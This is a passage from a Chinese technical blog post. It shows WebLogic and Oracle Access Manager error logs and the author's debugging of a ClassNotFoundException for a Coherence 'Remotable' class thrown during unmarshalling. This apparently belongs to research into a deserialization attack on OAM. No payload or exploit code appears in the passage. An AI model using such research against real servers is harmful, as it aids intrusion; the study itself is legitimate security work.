</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.security.AccessController.doPrivileged(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.run(ExecuteThread.java:360)</span>
</span></span><span style=display:flex><span> <span style=color:#a6e22e>SUPP_ATTRS =</span> <span style=color:#e6db74>{severity-value=8,</span> <span style=color:#a6e22e>rid=</span><span style=color:#e6db74>0,</span> <span style=color:#a6e22e>partition-id=</span><span style=color:#e6db74>0,</span> <span style=color:#a6e22e>partition-name=</span><span style=color:#e6db74>DOMAIN}</span> <span style=color:#a6e22e>SERVER =</span> <span style=color:#e6db74>oam_server1</span> <span style=color:#a6e22e>TIMESTAMP =</span> <span style=color:#e6db74>1657798361730</span> <span style=color:#a6e22e>USERID =</span> <span style=color:#e6db74>&lt;WLS</span> <span style=color:#960050;background-color:#1e0010>Kernel</span><span style=color:#f92672>&gt;</span> MACHINE = dfc3a0c6eea8 MSGID = BEA-101017 DATE = Jul 14, 2022 11:32:41,730 AM UTC SUBSYSTEM = HTTP CONTEXTID = 3c3067f6-a549-49e6-9215-202b032cf4e1-0000014f TXID =  THREAD = [ACTIVE] ExecuteThread: &#39;20&#39; for queue: &#39;weblogic.kernel.Default (self-tuning)&#39; SEVERITY = Error  
</span></span><span style=display:flex><span>WatchAlarmType: AutomaticReset 
</span></span><span style=display:flex><span>WatchAlarmResetPeriod: 30000 
</span></span><span style=display:flex><span>&gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:32:41,866</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Emergency&gt;</span> <span style=color:#f92672>&lt;oracle.dfw.incident&gt;</span> <span style=color:#f92672>&lt;BEA-000000&gt;</span> <span style=color:#f92672>&lt;incident</span> <span style=color:#960050;background-color:#1e0010>32</span> <span style=color:#960050;background-color:#1e0010>created</span> <span style=color:#960050;background-color:#1e0010>with</span> <span style=color:#960050;background-color:#1e0010>problem</span> <span style=color:#960050;background-color:#1e0010>key</span> <span style=color:#960050;background-color:#1e0010>&#34;DFW-99998</span> <span style=color:#960050;background-color:#1e0010>[java.lang.ClassNotFoundException][oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal][oam_server]&#34;</span><span style=color:#f92672>&gt;</span> 
</span></span></code></pre></td></tr></table></div></div><p>是由 <code>ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable</code> 引起的 <code>NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable</code> 。</p><p>通过下条件异常断点快速复现</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-74-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-74-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>detailMessage</span><span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;internal.util.invoke.Remotable&#34;</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714185615887.png alt=image-20220714185615887></p><p>可以看到是在尝试defineclass的时候尝试用 <code>weblogic.utils.classloaders.GenericClassLoader</code> 去加载 <code>com.tangosol.internal.util.invoke.Remotable</code> ，但没有找到。</p><p><img loading=lazy src=image-20220714185851405.png alt=image-20220714185851405></p><p>搜索类加载器确实也没有</p><p><img loading=lazy src=image-20220714190616935.png alt=image-20220714190616935></p><p>报错完整调用栈</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-69>69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-70>70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-71>71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-72>72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-73>73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-74>74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-75>75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-76>76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-77>77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-78>78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-79>79</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-80><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-80>80</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-81><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-81>81</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-82><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-82>82</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-83><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-83>83</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-84><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-84>84</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-75-85><a style=outline:none;text-decoration:none;color:inherit href=#hl-75-85>85</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>findLocalClass:<span style=color:#ae81ff>1029</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
